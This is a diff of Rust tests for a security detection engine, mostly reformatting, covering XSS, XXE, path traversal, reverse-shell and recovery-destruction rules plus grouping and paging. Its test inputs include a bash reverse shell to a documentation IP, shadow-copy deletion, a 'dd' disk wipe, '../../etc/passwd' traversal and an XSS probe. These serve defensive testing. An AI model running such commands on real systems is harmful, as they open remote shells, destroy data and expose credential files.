-        let e=event(0,0,fields.clone());let r=detections::run(&input,&Source::Events(vec![&e])).unwrap();
-        assert!(r.detections.is_empty(),"legitimate/context-only: {fields}: {:?}",r.detections.iter().map(|d|&d.rule).collect::<Vec<_>>());
+        json!({"response":{"body":"No mapping found for HTTP request with URI [/etc/passwd] in dispatcher"}}),
+    ] {
+        let e = event(0, 0, fields.clone());
+        let r = detections::run(&input, &Source::Events(vec![&e])).unwrap();
+        assert!(
+            r.detections.is_empty(),
+            "legitimate/context-only: {fields}: {:?}",
+            r.detections.iter().map(|d| &d.rule).collect::<Vec<_>>()
+        );
     }
-    let e=application_request(0,0,"/?q=<script>alert(1)</script>");
-    let r=detections::run(&input,&Source::Events(vec![&e])).unwrap();
-    assert!(r.detections.iter().any(|d|d.rule=="content.xss_request"&&d.evidence.evidence_level==3));
-    assert!(!r.detections.iter().any(|d|d.signal_rules.iter().any(|r|r.starts_with("web.xss."))));
+    let e = application_request(0, 0, "/?q=<script>alert(1)</script>");
+    let r = detections::run(&input, &Source::Events(vec![&e])).unwrap();
+    assert!(r
+        .detections
+        .iter()
+        .any(|d| d.rule == "content.xss_request" && d.evidence.evidence_level == 3));
+    assert!(!r
+        .detections
+        .iter()
+        .any(|d| d.signal_rules.iter().any(|r| r.starts_with("web.xss."))));
 }
 fn web_content(id: usize, path: &str, body: &str) -> Event {
     event(
@@ -558,9 +1117,14 @@ fn content_custom_source_mapping_and_size_limits_are_explicit() {
         .any(|s| s.contains("64 KiB")));
 }
 fn custom(rule: Value, events: &[Event], settings: &Settings) -> Triage {
-    let rules = detections::test_ruleset(vec![serde_json::from_value(rule).unwrap()], vec![]).unwrap();
+    let rules =
+        detections::test_ruleset(vec![serde_json::from_value(rule).unwrap()], vec![]).unwrap();
     detections::run(
-        &detections::Inputs { rules: &rules, settings, catalog: None },
+        &detections::Inputs {
+            rules: &rules,
+            settings,
+            catalog: None,
+        },
         &Source::Events(events.iter().collect()),
     )
     .unwrap()
@@ -570,26 +1134,42 @@ fn custom(rule: Value, events: &[Event], settings: &Settings) -> Triage {
 fn security_ratio_and_numeric_aggregates_use_full_denominator() {
     let ratio = json!({"id":"ratio-test","name":"Proporção em autenticação direcionada","severity":"high","kind":"ratio","where":"_sec.action:logon","by":["_sec.host"],"window":"5m","count":4,"ratio":{"numerator":"_sec.outcome:failure","gte":0.75},"evidence":{"level":2,"rationale":"Falhas predominantes no contexto declarado","maturity":"experimental"}});
     let mut events:Vec<_>=(0..4).map(|i|event(i,i as i64,json!({"event.category":"authentication","event.action":"logon","event.outcome":if i<3{"failure"}else{"success"},"host.name":"h"}))).collect();
-    let settings = Settings { threats: false, ..Default::default() };
+    let settings = Settings {
+        threats: false,
+        ..Default::default()
+    };
     let r = custom(ratio.clone(), &events, &settings);
     assert_eq!(r.detections[0].measurements["numerator"], 3);
     assert_eq!(r.detections[0].measurements["denominator"], 4);
-    events[0].fields.insert("event.outcome".into(), json!("success"));
-    assert!(custom(ratio.clone(), &events, &settings).detections.is_empty());
-    events[0].fields.insert("event.outcome".into(), json!("failure"));
+    events[0]
+        .fields
+        .insert("event.outcome".into(), json!("success"));
+    assert!(custom(ratio.clone(), &events, &settings)
+        .detections
+        .is_empty());
+    events[0]
+        .fields
+        .insert("event.outcome".into(), json!("failure"));
     events[3].timestamp = events[0].timestamp.map(|t| t + 300001);
-    assert!(custom(ratio.clone(), &events, &settings).detections.is_empty());
+    assert!(custom(ratio.clone(), &events, &settings)
+        .detections
+        .is_empty());
     let boundary = (events[0].timestamp.unwrap().div_euclid(300000) + 1) * 300000;
     let mut straddled = Vec::new();
     for i in 0..14 {
         let mut e = events[0].clone();
         e.id = i;
         e.timestamp = Some(boundary + i as i64 - 10);
-        e.fields.insert("event.outcome".into(), json!(if i < 10 { "success" } else { "failure" }));
+        e.fields.insert(
+            "event.outcome".into(),
+            json!(if i < 10 { "success" } else { "failure" }),
+        );
         straddled.push(e);
     }
     assert!(
-        custom(ratio.clone(), &straddled, &settings).detections.is_empty(),
+        custom(ratio.clone(), &straddled, &settings)
+            .detections
+            .is_empty(),
         "Partition boundary must retain successful events in denominator"
     );
     for e in &mut straddled {
@@ -601,8 +1181,16 @@ fn security_ratio_and_numeric_aggregates_use_full_denominator() {
     );
     let aggregate = json!({"id":"aggregate-test","name":"Volume em transferência sensível","severity":"high","kind":"aggregate","where":"_sec.action:object_transfer","by":["_sec.host"],"window":"5m","count":2,"aggregate":{"field":"bytes","operation":"sum","gte":100},"evidence":{"level":2,"rationale":"Transferência previamente selecionada como sensível","maturity":"experimental"}});
     let events = vec![
-        event(0, 0, json!({"event.category":"network","event.action":"object_transfer","host.name":"h","bytes":40})),
-        event(1, 1, json!({"event.category":"network","event.action":"object_transfer","host.name":"h","bytes":60})),
+        event(
+            0,
+            0,
+            json!({"event.category":"network","event.action":"object_transfer","host.name":"h","bytes":40}),
+        ),
+        event(
+            1,
+            1,
+            json!({"event.category":"network","event.action":"object_transfer","host.name":"h","bytes":60}),
+        ),
     ];
     let r = custom(aggregate.clone(), &events, &settings);
     assert_eq!(r.detections[0].measurements["value"], 100.0);
@@ -634,8 +1222,13 @@ fn security_absence_requires_complete_explicit_source_coverage() {
     let rule = json!({"id":"absence-test","name":"Operação suspeita sem evento esperado","severity":"medium","kind":"absence","by":["_sec.host"],"window":"5m","coverage":"process","steps":[{"where":"phase:anchor"},{"where":"phase:expected"}],"evidence":{"level":2,"rationale":"Âncora suspeita explicitamente selecionada","maturity":"experimental"}});
     let mut anchor = process(0, 0, "whoami");
     anchor.fields.insert("phase".into(), json!("anchor"));
-    let mut settings = Settings { threats: false, ..Default::default() };
-    assert!(custom(rule.clone(), &[anchor.clone()], &settings).detections.is_empty());
+    let mut settings = Settings {
+        threats: false,
+        ..Default::default()
+    };
+    assert!(custom(rule.clone(), &[anchor.clone()], &settings)
+        .detections
+        .is_empty());
     let fingerprint = custom(rule.clone(), &[anchor.clone()], &settings).dataset_fingerprint;
     settings.coverage.push(detections::CoverageWindow {
         dataset_fingerprint: fingerprint,
@@ -652,24 +1245,48 @@ fn security_absence_requires_complete_explicit_source_coverage() {
     assert_eq!(r.detections[0].measurements["expected_events"], 0);
     let mut expected = process(1, 300, "whoami");
     expected.fields.insert("phase".into(), json!("expected"));
-    settings.coverage[0].dataset_fingerprint =
-        custom(rule.clone(), &[anchor.clone(), expected.clone()], &Settings::default()).dataset_fingerprint;
-    assert!(custom(rule.clone(), &[anchor.clone(), expected.clone()], &settings).detections.is_empty());
-    expected.timestamp = None;
-    settings.coverage[0].dataset_fingerprint =
-        custom(rule.clone(), &[anchor.clone(), expected.clone()], &Settings::default()).dataset_fingerprint;
-    assert!(custom(rule.clone(), &[anchor.clone(), expected.clone()], &settings).detections.is_empty());
-    expected.fields.remove("host.name");
-    settings.coverage[0].dataset_fingerprint =
-        custom(rule.clone(), &[anchor.clone(), expected.clone()], &Settings::default()).dataset_fingerprint;
+    settings.coverage[0].dataset_fingerprint = custom(
+        rule.clone(),
+        &[anchor.clone(), expected.clone()],
+        &Settings::default(),
+    )
+    .dataset_fingerprint;
     assert!(
-        custom(rule.clone(), &[anchor.clone(), expected], &settings).detections.is_empty(),
+        custom(rule.clone(), &[anchor.clone(), expected.clone()], &settings)
+            .detections
+            .is_empty()
+    );
+    expected.timestamp = None;
+    settings.coverage[0].dataset_fingerprint = custom(
+        rule.clone(),
+        &[anchor.clone(), expected.clone()],
+        &Settings::default(),
+    )
+    .dataset_fingerprint;
+    assert!(
+        custom(rule.clone(), &[anchor.clone(), expected.clone()], &settings)
+            .detections
+            .is_empty()
+    );
+    expected.fields.remove("host.name");
+    settings.coverage[0].dataset_fingerprint = custom(
+        rule.clone(),
+        &[anchor.clone(), expected.clone()],
+        &Settings::default(),
+    )
+    .dataset_fingerprint;
+    assert!(
+        custom(rule.clone(), &[anchor.clone(), expected], &settings)
+            .detections
+            .is_empty(),
         "Unjoinable expected event prevents an absence claim"
     );
     settings.coverage[0].dataset_fingerprint =
         custom(rule.clone(), &[anchor.clone()], &Settings::default()).dataset_fingerprint;
     settings.coverage[0].end -= 1;
-    assert!(custom(rule.clone(), &[anchor.clone()], &settings).detections.is_empty());
+    assert!(custom(rule.clone(), &[anchor.clone()], &settings)
+        .detections
+        .is_empty());
     settings.coverage[0].end += 1;
     settings.coverage[0].source = "another-source".into();
     assert!(custom(rule, &[anchor], &settings).detections.is_empty());
@@ -679,15 +1296,26 @@ fn security_absence_requires_complete_explicit_source_coverage() {
 fn security_disk_pages_preserve_levels_members_and_universe() {
     let events = chains().remove(0).1;
     let rules = detections::builtin_ruleset().unwrap();
-    let settings = Settings { threats: false, ..Default::default() };
-    let inputs = detections::Inputs { rules: &rules, settings: &settings, catalog: None };
+    let settings = Settings {
+        threats: false,
+        ..Default::default()
+    };
+    let inputs = detections::Inputs {
+        rules: &rules,
+        settings: &settings,
+        catalog: None,
+    };
     let in_memory = detections::run(&inputs, &Source::Events(events.iter().collect())).unwrap();
     let stored = detections::run_stored(&inputs, &Source::Events(events.iter().collect())).unwrap();
     let page = stored.page(1, 0, 1, None, None).unwrap();
     assert_eq!(page["counts_by_level"], json!(in_memory.counts_by_level));
     assert_eq!(page["analysis_id"], in_memory.analysis_id);
     for d in page["detections"].as_array().unwrap() {
-        let original = in_memory.detections.iter().find(|x| x.id == d["id"]).unwrap();
+        let original = in_memory
+            .detections
+            .iter()
+            .find(|x| x.id == d["id"])
+            .unwrap();
         assert_eq!(d["evidence_level"], original.evidence.evidence_level);
         assert_eq!(d["event_refs"], json!(original.evidence.event_refs));
     }
@@ -703,7 +1331,10 @@ fn security_disk_pages_preserve_levels_members_and_universe() {
             None => break,
         }
     }
-    assert_eq!(all.len(), page["episodes"][0]["detection_count"].as_u64().unwrap() as usize);
+    assert_eq!(
+        all.len(),
+        page["episodes"][0]["detection_count"].as_u64().unwrap() as usize
+    );
     let mut related = std::iter::once(events[1].id);
     let narrow = stored.page(5, 0, 1, Some(&mut related), None).unwrap();
     assert_eq!(narrow["analysis_id"], page["analysis_id"]);
@@ -720,31 +1351,60 @@ fn security_pattern_groups_preserve_all_occurrences_before_paging() {
         e
     }).collect();
     let rules = detections::builtin_ruleset().unwrap();
-    let settings = Settings { threats: false, ..Default::default() };
-    let inputs = detections::Inputs { rules: &rules, settings: &settings, catalog: None };
+    let settings = Settings {
+        threats: false,
+        ..Default::default()
+    };
+    let inputs = detections::Inputs {
+        rules: &rules,
+        settings: &settings,
+        catalog: None,
+    };
     let memory = detections::run(&inputs, &Source::Events(events.iter().collect())).unwrap();
     assert_eq!(memory.detections.len(), 205);
-    assert_eq!(memory.episodes.len(), 1, "log wrappers must not create repeated cards");
+    assert_eq!(
+        memory.episodes.len(),
+        1,
+        "log wrappers must not create repeated cards"
+    );
     let group = &memory.episodes[0];
     assert_eq!(group.grouping.as_ref().unwrap().occurrence_count, 205);
     assert_eq!(group.evidence_level, 4);
     assert_eq!(group.event_refs.len(), 205);
-    assert_eq!((group.start, group.end), (events[0].timestamp, events[204].timestamp));
-    assert!(memory.detections.iter().all(|d| d.count == 1 && d.evidence.relationships.is_empty()
-        && d.evidence.evidence_level == 4 && d.evidence.outcome == "blocked"));
+    assert_eq!(
+        (group.start, group.end),
+        (events[0].timestamp, events[204].timestamp)
+    );
+    assert!(memory.detections.iter().all(|d| d.count == 1
+        && d.evidence.relationships.is_empty()
+        && d.evidence.evidence_level == 4
+        && d.evidence.outcome == "blocked"));
     let disk = detections::run_stored(&inputs, &Source::Events(events.iter().collect())).unwrap();
     let page = disk.page(4, 0, 1, None, None).unwrap();
     assert_eq!(page["page"]["total_episodes"], 1);
     assert!(page["page"]["next_offset"].is_null());
     assert_eq!(page["episodes"][0]["id"], group.id);
-    assert_eq!(page["episodes"][0]["participants"], json!(group.participants));
-    assert!(group.participants.facts.iter().any(|f| f.value=="192.0.2.8" && f.origins_limited));
+    assert_eq!(
+        page["episodes"][0]["participants"],
+        json!(group.participants)
+    );
+    assert!(group
+        .participants
+        .facts
+        .iter()
+        .any(|f| f.value == "192.0.2.8" && f.origins_limited));
     assert_eq!(page["episodes"][0]["grouping"]["occurrence_count"], 205);
     assert_eq!(page["episodes"][0]["members_complete"], false);
     assert_eq!(page["counts_by_level"], json!(memory.counts_by_level));
     assert_eq!(page["visible_detections"], 205);
-    assert_eq!(disk.page(5, 0, 1, None, None).unwrap()["page"]["total_episodes"], 0);
-    assert_eq!(disk.page(1, 0, 1, None, None).unwrap()["episodes"][0]["id"], group.id);
+    assert_eq!(
+        disk.page(5, 0, 1, None, None).unwrap()["page"]["total_episodes"],
+        0
+    );
+    assert_eq!(
+        disk.page(1, 0, 1, None, None).unwrap()["episodes"][0]["id"],
+        group.id
+    );
     let mut ids = std::iter::once(204);
     let filtered = disk.page(4, 0, 1, Some(&mut ids), None).unwrap();
     assert_eq!(filtered["visible_detections"], 1);
@@ -763,11 +1423,19 @@ fn security_pattern_groups_preserve_all_occurrences_before_paging() {
             assert_eq!(d["relationships"], json!([]));
             assert_eq!(d["evidence_level"], 4);
             assert!(all.insert(d["id"].as_str().unwrap().to_string()));
-            let original_episode = disk.episode_members(d["source_episode_id"].as_str().unwrap(), 0, 1).unwrap();
-            assert_eq!(original_episode["total"], 1, "original episode remains addressable");
+            let original_episode = disk
+                .episode_members(d["source_episode_id"].as_str().unwrap(), 0, 1)
+                .unwrap();
+            assert_eq!(
+                original_episode["total"], 1,
+                "original episode remains addressable"
+            );
             assert_eq!(original_episode["detections"][0]["id"], d["id"]);
         }
-        match members["next_offset"].as_u64() { Some(n) => offset = n as usize, None => break }
+        match members["next_offset"].as_u64() {
+            Some(n) => offset = n as usize,
+            None => break,
+        }
     }
     assert_eq!(all.len(), 205);
     let reversed: Vec<_> = events.iter().rev().cloned().collect();
@@ -776,19 +1444,36 @@ fn security_pattern_groups_preserve_all_occurrences_before_paging() {
 
 #[test]
 fn security_pattern_groups_keep_context_payload_and_outcome_boundaries() {
-    let e = event(0, 0, json!({"message":"Entity resolution disallowed for file:///etc/passwd","host.name":"server-a"}));
+    let e = event(
+        0,
+        0,
+        json!({"message":"Entity resolution disallowed for file:///etc/passwd","host.name":"server-a"}),
+    );
     let result = run(&[e]);
-    let original = result.detections.iter().find(|d| d.rule == "content.xxe_blocked").unwrap();
+    let original = result
+        .detections
+        .iter()
+        .find(|d| d.rule == "content.xxe_blocked")
+        .unwrap();
     let key = crate::security_grouping::pattern(original).expect("complete single-event pattern");
     let mut changed = original.clone();
-    changed.start = None; changed.end = None;
+    changed.start = None;
+    changed.end = None;
     changed.evidence.excerpts[0].before = "another timestamp and worker".into();
     changed.evidence.excerpts[0].after = "a different stack trace".into();
-    assert_eq!(crate::security_grouping::pattern(&changed).as_ref(), Some(&key));
-    let mut signal = original.clone(); signal.kind = "signal".into(); signal.signal_rules = vec!["signal-a".into()];
+    assert_eq!(
+        crate::security_grouping::pattern(&changed).as_ref(),
+        Some(&key)
+    );
+    let mut signal = original.clone();
+    signal.kind = "signal".into();
+    signal.signal_rules = vec!["signal-a".into()];
     let signal_key = crate::security_grouping::pattern(&signal).expect("standalone text signal");
     signal.signal_rules.push("signal-b".into());
-    assert_ne!(crate::security_grouping::pattern(&signal).as_ref(), Some(&signal_key));
+    assert_ne!(
+        crate::security_grouping::pattern(&signal).as_ref(),
+        Some(&signal_key)
+    );
     for variant in 0..10 {
         let mut changed = original.clone();
         match variant {
@@ -796,19 +1481,43 @@ fn security_pattern_groups_keep_context_payload_and_outcome_boundaries() {
             1 => changed.evidence.outcome = "success".into(),
             2 => changed.evidence.claim = "effect".into(),
             3 => changed.namespace = "another-tenant".into(),
-            4 => changed.evidence.excerpts[0].matched = "Entity resolution disallowed for file:///etc/shadow".into(),
+            4 => {
+                changed.evidence.excerpts[0].matched =
+                    "Entity resolution disallowed for file:///etc/shadow".into()
+            }
             5 => changed.evidence.excerpts[0].field = "response.body".into(),
             6 => changed.pattern_source = Some("another-file".into()),
-            7 => changed.evidence.evidence_members[0].provenance.get_mut("host").unwrap().value = "server-b".into(),
+            7 => {
+                changed.evidence.evidence_members[0]
+                    .provenance
+                    .get_mut("host")
+                    .unwrap()
+                    .value = "server-b".into()
+            }
             8 => changed.evidence.rule_version = "another-version".into(),
-            _ => changed.entities.push(detections::EntityRef { column:"@src_ip".into(),label:"IP".into(),value:"192.0.2.9".into() }),
+            _ => changed.entities.push(detections::EntityRef {
+                column: "@src_ip".into(),
+                label: "IP".into(),
+                value: "192.0.2.9".into(),
+            }),
         }
-        assert_ne!(crate::security_grouping::pattern(&changed).as_ref(), Some(&key), "variant {variant}");
+        assert_ne!(
+            crate::security_grouping::pattern(&changed).as_ref(),
+            Some(&key),
+            "variant {variant}"
+        );
     }
-    let mut different_identity=original.clone();
-    different_identity.participants=crate::security_participants::extract(
-        &event(0,0,json!({"source.user.name":"another-identity"})),&Default::default(),"content.xxe_blocked",&[]);
-    assert_ne!(crate::security_grouping::pattern(&different_identity).as_ref(),Some(&key));
+    let mut different_identity = original.clone();
+    different_identity.participants = crate::security_participants::extract(
+        &event(0, 0, json!({"source.user.name":"another-identity"})),
+        &Default::default(),
+        "content.xxe_blocked",
+        &[],
+    );
+    assert_ne!(
+        crate::security_grouping::pattern(&different_identity).as_ref(),
+        Some(&key)
+    );
     for variant in 0..6 {
         let mut changed = original.clone();
         match variant {
@@ -817,7 +1526,14 @@ fn security_pattern_groups_keep_context_payload_and_outcome_boundaries() {
             2 => changed.evidence.excerpts[0].match_truncated = true,
             3 => changed.evidence.evidence_level = 0,
             4 => changed.participants.limited = true,
-            _ => changed.evidence.relationships.push(crate::evidence::Relationship {kind:"reconstruction".into(),fields:vec![],description:"fragments".into()}),
+            _ => changed
+                .evidence
+                .relationships
+                .push(crate::evidence::Relationship {
+                    kind: "reconstruction".into(),
+                    fields: vec![],
+                    description: "fragments".into(),
+                }),
         }
         assert!(crate::security_grouping::pattern(&changed).is_none());
     }
@@ -825,34 +1541,59 @@ fn security_pattern_groups_keep_context_payload_and_outcome_boundaries() {
 
 #[test]
 fn security_pattern_groups_keep_individual_levels_with_multiple_rules_per_event() {
-    let events: Vec<_> = (0..3).map(|id| web_content(id,"/download?file=../../etc/passwd",PASSWD_CONTENT)).collect();
+    let events: Vec<_> = (0..3)
+        .map(|id| web_content(id, "/download?file=../../etc/passwd", PASSWD_CONTENT))
+        .collect();
     let memory = run(&events);
     assert_eq!(memory.episodes.len(), 1);
     let group = &memory.episodes[0];
     assert_eq!(group.grouping.as_ref().unwrap().occurrence_count, 3);
     assert_eq!(group.event_refs.len(), 3);
     assert_eq!(group.evidence_level, 5);
-    let levels: std::collections::BTreeSet<_> = memory.detections.iter().map(|d|d.evidence.evidence_level).collect();
-    assert_eq!(levels, [3,4,5].into_iter().collect(), "context findings keep their own levels");
+    let levels: std::collections::BTreeSet<_> = memory
+        .detections
+        .iter()
+        .map(|d| d.evidence.evidence_level)
+        .collect();
+    assert_eq!(
+        levels,
+        [3, 4, 5].into_iter().collect(),
+        "context findings keep their own levels"
+    );
     let rules = detections::builtin_ruleset().unwrap();
-    let settings = Settings { threats:false, ..Default::default() };
-    let inputs = detections::Inputs { rules:&rules, settings:&settings, catalog:None };
+    let settings = Settings {
+        threats: false,
+        ..Default::default()
+    };
+    let inputs = detections::Inputs {
+        rules: &rules,
+        settings: &settings,
+        catalog: None,
+    };
     let disk = detections::run_stored(&inputs, &Source::Events(events.iter().collect())).unwrap();
-    let page = disk.page(5,0,20,None,None).unwrap();
-    assert_eq!(page["episodes"].as_array().unwrap().len(),1);
-    assert_eq!(page["episodes"][0]["id"],group.id);
-    assert_eq!(page["episodes"][0]["record_count"],3);
-    assert_eq!(page["counts_by_level"],json!(memory.counts_by_level));
+    let page = disk.page(5, 0, 20, None, None).unwrap();
+    assert_eq!(page["episodes"].as_array().unwrap().len(), 1);
+    assert_eq!(page["episodes"][0]["id"], group.id);
+    assert_eq!(page["episodes"][0]["record_count"], 3);
+    assert_eq!(page["counts_by_level"], json!(memory.counts_by_level));
     for d in page["detections"].as_array().unwrap() {
-        assert_eq!(d["context_only"],d["evidence_level"].as_u64().unwrap()<5);
+        assert_eq!(d["context_only"], d["evidence_level"].as_u64().unwrap() < 5);
     }
-    assert!(memory.detections.len()>3, "group occurrences count events, not rule matches");
+    assert!(
+        memory.detections.len() > 3,
+        "group occurrences count events, not rule matches"
+    );
 }
 
 #[test]
 fn security_large_episode_filter_keeps_visible_witness_and_all_members() {
     let mut meta = run(&[process(0, 0, "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1")]);
-    let template = meta.detections.iter().find(|d| d.rule == "attempt.reverse-shell.process").unwrap().clone();
+    let template = meta
+        .detections
+        .iter()
+        .find(|d| d.rule == "attempt.reverse-shell.process")
+        .unwrap()
+        .clone();
     meta.detections.clear();
     meta.episodes.clear();
     let mut writer = crate::security_results::Writer::new().unwrap();
@@ -864,7 +1605,10 @@ fn security_large_episode_filter_keeps_visible_witness_and_all_members() {
         member.event_id = i + 1;
         member.event_ref = format!("member-{i:03}");
         unassessed.event_ids.push(i + 1);
-        unassessed.evidence.event_refs.push(member.event_ref.clone());
+        unassessed
+            .evidence
+            .event_refs
+            .push(member.event_ref.clone());
         unassessed.evidence.evidence_members.push(member);
     }
     writer.push(&unassessed).unwrap();
@@ -878,9 +1622,17 @@ fn security_large_episode_filter_keeps_visible_witness_and_all_members() {
         d.event_ids.push(i + 1);
         d.evidence.event_refs.push(member.event_ref.clone());
         d.evidence.evidence_members.push(member);
-        if i==204 {
-            d.participants=crate::security_participants::extract(
-                &event(205,0,json!({"source.ip":"192.0.2.204","service.name":"last-member"})),&Default::default(),&d.rule,&d.tactics);
+        if i == 204 {
+            d.participants = crate::security_participants::extract(
+                &event(
+                    205,
+                    0,
+                    json!({"source.ip":"192.0.2.204","service.name":"last-member"}),
+                ),
+                &Default::default(),
+                &d.rule,
+                &d.tactics,
+            );
         }
         writer.push(&d).unwrap();
     }
@@ -891,10 +1643,24 @@ fn security_large_episode_filter_keeps_visible_witness_and_all_members() {
     assert_eq!(page["detections"][0]["id"], "finding-204");
     assert_eq!(page["detections"][0]["context_only"], false);
     assert_eq!(page["episodes"][0]["members_complete"], false);
-    let first=stored.page(5,0,20,None,None).unwrap();
-    assert!(!first["detections"].as_array().unwrap().iter().any(|d|d["id"]=="finding-204"));
-    assert!(first["episodes"][0]["participants"]["facts"].as_array().unwrap().iter().any(|f|f["value"]=="192.0.2.204"),"Participants include members outside the preview and selected evidence level");
-    assert_eq!(page["episodes"][0]["participants"],first["episodes"][0]["participants"]);
+    let first = stored.page(5, 0, 20, None, None).unwrap();
+    assert!(!first["detections"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .any(|d| d["id"] == "finding-204"));
+    assert!(
+        first["episodes"][0]["participants"]["facts"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|f| f["value"] == "192.0.2.204"),
+        "Participants include members outside the preview and selected evidence level"
+    );
+    assert_eq!(
+        page["episodes"][0]["participants"],
+        first["episodes"][0]["participants"]
+    );
     let id = page["episodes"][0]["id"].as_str().unwrap();
     let mut found = std::collections::HashSet::new();
     let mut offset = 0;
@@ -912,26 +1678,43 @@ fn security_large_episode_filter_keeps_visible_witness_and_all_members() {
     let at = template.start.unwrap();
     let timeline = stored.timeline(1, at - 1, at + 1, None).unwrap();
     assert_eq!(timeline["count"], 205);
-    assert_eq!(stored.timeline(5, at - 1, at + 1, None).unwrap()["count"], 204);
+    assert_eq!(
+        stored.timeline(5, at - 1, at + 1, None).unwrap()["count"],
+        204
+    );
     let mut ids = std::iter::once(205);
-    assert_eq!(stored.timeline(1, at - 1, at + 1, Some(&mut ids)).unwrap()["count"], 1);
+    assert_eq!(
+        stored.timeline(1, at - 1, at + 1, Some(&mut ids)).unwrap()["count"],
+        1
+    );
     let mut ids = std::iter::once(205);
-    assert_eq!(stored.page(5, 0, 20, Some(&mut ids), None).unwrap()["visible_detections"], 0);
+    assert_eq!(
+        stored.page(5, 0, 20, Some(&mut ids), None).unwrap()["visible_detections"],
+        0
+    );
 }
 
 #[test]
 #[ignore = "Disk result benchmark; RESULT_FINDINGS defaults to 100001, exceeds old output limits"]
 fn benchmark_security_result_store() {
-    let count = std::env::var("RESULT_FINDINGS").ok().and_then(|s| s.parse::<usize>().ok()).unwrap_or(100001);
+    let count = std::env::var("RESULT_FINDINGS")
+        .ok()
+        .and_then(|s| s.parse::<usize>().ok())
+        .unwrap_or(100001);
     let events = vec![process(0, 0, "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1")];
     let mut meta = run(&events);
-    let mut d = meta.detections.iter().find(|d| d.rule == "attempt.reverse-shell.process").unwrap().clone();
+    let mut d = meta
+        .detections
+        .iter()
+        .find(|d| d.rule == "attempt.reverse-shell.process")
+        .unwrap()
+        .clone();
     meta.detections.clear();
     meta.episodes.clear();
     meta.entities.clear();
     meta.total = count;
     let start = std::time::Instant::now();
-    let working = crate::security_store::working_lane();
+    let working = crate::security_store::working_lane().unwrap();
     let mut writer = crate::security_results::Writer::new().unwrap();
     for i in 0..count {
         let reference = format!("volume-event-{i:09}");
@@ -949,7 +1732,12 @@ fn benchmark_security_result_store() {
     let last = result.page(5, count - 1, 20, None, None).unwrap();
     assert_eq!(first["visible_detections"], count);
     assert_eq!(last["detections"].as_array().unwrap().len(), 1);
-    assert_eq!(result.related(&format!("volume-event-{:09}", count - 1)).unwrap()[0]["event_ids"][0], count - 1);
+    assert_eq!(
+        result
+            .related(&format!("volume-event-{:09}", count - 1))
+            .unwrap()[0]["event_ids"][0],
+        count - 1
+    );
     let mut all = std::collections::HashSet::new();
     for page in [first, last] {
         for d in page["detections"].as_array().unwrap() {
@@ -1016,10 +1804,15 @@ fn chains() -> Vec<(&'static str, Vec<Event>)> {
             json!({"event.category":"process","event.action":"process_start","event.outcome":"success","host.name":"h","process.executable":"/tmp/payload","process.command_line":command}),
         ),
     ];
-    let mut recovery =
-        vec![process(0, 0, "vssadmin delete shadows /all /quiet"), process(1, 1, "dd if=/dev/zero of=/dev/sda")];
+    let mut recovery = vec![
+        process(0, 0, "vssadmin delete shadows /all /quiet"),
+        process(1, 1, "dd if=/dev/zero of=/dev/sda"),
+    ];
     for e in &mut recovery {
-        e.fields.insert("process.parent.entity_id".into(), json!("same-parent-instance"));
+        e.fields.insert(
+            "process.parent.entity_id".into(),
+            json!("same-parent-instance"),
+        );
     }
     vec![
         ("chain.web.command", web),
@@ -1034,13 +1827,27 @@ fn chains() -> Vec<(&'static str, Vec<Event>)> {
 fn security_five_reference_correlations_require_every_stage_and_relation() {
     for (rule, events) in chains() {
         let result = run(&events);
-        let d =
-            result.detections.iter().find(|d| d.rule == rule).unwrap_or_else(|| {
-                panic!("{rule}: {:?}", result.detections.iter().map(|d| &d.rule).collect::<Vec<_>>())
+        let d = result
+            .detections
+            .iter()
+            .find(|d| d.rule == rule)
+            .unwrap_or_else(|| {
+                panic!(
+                    "{rule}: {:?}",
+                    result
+                        .detections
+                        .iter()
+                        .map(|d| &d.rule)
+                        .collect::<Vec<_>>()
+                )
             });
         assert_eq!(
             d.evidence.evidence_level,
-            if ["chain.recovery.destruction", "chain.cloud.credential"].contains(&rule) { 4 } else { 5 },
+            if ["chain.recovery.destruction", "chain.cloud.credential"].contains(&rule) {
+                4
+            } else {
+                5
+            },
             "{rule}"
         );
         assert_eq!(d.event_ids.len(), events.len());
@@ -1048,7 +1855,10 @@ fn security_five_reference_correlations_require_every_stage_and_relation() {
         for missing in 0..events.len() {
             let mut less = events.clone();
             less.remove(missing);
-            assert!(!contains(&run(&less), rule), "{rule} accepted missing step {missing}");
+            assert!(
+                !contains(&run(&less), rule),
+                "{rule} accepted missing step {missing}"
+            );
         }
         let mut late = events.clone();
         late.last_mut().unwrap().timestamp = Some(events[0].timestamp.unwrap() + 86_400_001);
@@ -1059,7 +1869,8 @@ fn security_five_reference_correlations_require_every_stage_and_relation() {
         let mut blocked = events.clone();
         let last = blocked.last_mut().unwrap();
         last.fields.insert("event.outcome".into(), json!("failure"));
-        last.fields.insert("errorCode".into(), json!("AccessDenied"));
+        last.fields
+            .insert("errorCode".into(), json!("AccessDenied"));
         assert!(!contains(&run(&blocked), rule), "{rule} accepted denial");
     }
 }
@@ -1084,8 +1895,18 @@ fn security_rigidity_is_cumulative_and_does_not_reclassify_or_change_ids() {
         assert!(previous.is_subset(&ids));
         previous = ids;
         for d in selected["detections"].as_array().unwrap() {
-            let original = full["detections"].as_array().unwrap().iter().find(|old| old["id"] == d["id"]).unwrap();
-            for field in ["evidence_level", "event_refs", "relationships", "evidence_members"] {
+            let original = full["detections"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .find(|old| old["id"] == d["id"])
+                .unwrap();
+            for field in [
+                "evidence_level",
+                "event_refs",
+                "relationships",
+                "evidence_members",
+            ] {
                 assert_eq!(d[field], original[field]);
             }
             if d["context_only"] != true {
@@ -1099,10 +1920,16 @@ fn security_rigidity_is_cumulative_and_does_not_reclassify_or_change_ids() {
 fn security_e5_claim_does_not_promote_context_components() {
     for (_, events) in chains() {
         let result = run(&events);
-        let originals: std::collections::HashMap<_, _> =
-            result.detections.iter().map(|d| (d.id.clone(), d.evidence.evidence_level)).collect();
+        let originals: std::collections::HashMap<_, _> = result
+            .detections
+            .iter()
+            .map(|d| (d.id.clone(), d.evidence.evidence_level))
+            .collect();
         let full = serde_json::to_value(result).unwrap();
-        for d in crate::triage::project(&full, 5, None)["detections"].as_array().unwrap() {
+        for d in crate::triage::project(&full, 5, None)["detections"]
+            .as_array()
+            .unwrap()
+        {
             assert_eq!(d["evidence_level"], originals[d["id"].as_str().unwrap()]);
         }
     }
